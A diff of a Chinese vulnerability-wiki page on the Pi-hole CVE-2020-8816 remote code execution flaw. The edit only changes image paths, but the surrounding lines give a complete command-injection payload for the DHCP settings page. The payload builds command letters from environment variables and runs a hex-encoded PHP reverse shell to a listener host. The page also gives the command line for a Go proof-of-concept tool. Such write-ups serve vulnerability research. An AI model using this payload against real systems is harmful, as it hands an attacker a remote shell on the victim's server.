@@ -76,11 +76,11 @@ Pi-hole \<= 4.3.2
 
 在浏览器中进入http://www.0-sec.org/admin，登陆后，选择Setting-\>DHCP选项卡，先试一下PATH变量，输入aaaaaaaaaaaa\$PATH，结果显示：
 
-![1.png](/Users/aresx/Documents/VulWiki/.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId26.png)
+![1.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId26.png)
 
 很遗憾，没有h字符，看来还需要找其他环境变量。我在env命令的执行结果中找到了PWD变量，输入试一下：
 
-![2.png](/Users/aresx/Documents/VulWiki/.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId27.png)
+![2.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId27.png)
 
 里面有h和r，所以，我可以使用PATH和PWD两个环境变量，获得p、h、r这几个字符。
 
@@ -122,7 +122,7 @@ Pi-hole \<= 4.3.2
 
     aaaaaaaaaaaa&&SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
 
-返回主机，可以看到主机收到了连接，可以执行命令了：![3.png](/Users/aresx/Documents/VulWiki/.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId31.png)
+返回主机，可以看到主机收到了连接，可以执行命令了：![3.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId31.png)
 
 ### poc
 
@@ -132,11 +132,11 @@ Pi-hole \<= 4.3.2
 
 `./CVE-2020-8816 -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/`
 
-![4.png](/Users/aresx/Documents/VulWiki/.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId33.png)
+![4.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId33.png)
 
-![5.png](/Users/aresx/Documents/VulWiki/.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId34.png)
+![5.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId34.png)
 
-![6.png](/Users/aresx/Documents/VulWiki/.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId35.png)
+![6.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId35.png)
 
     package main
 
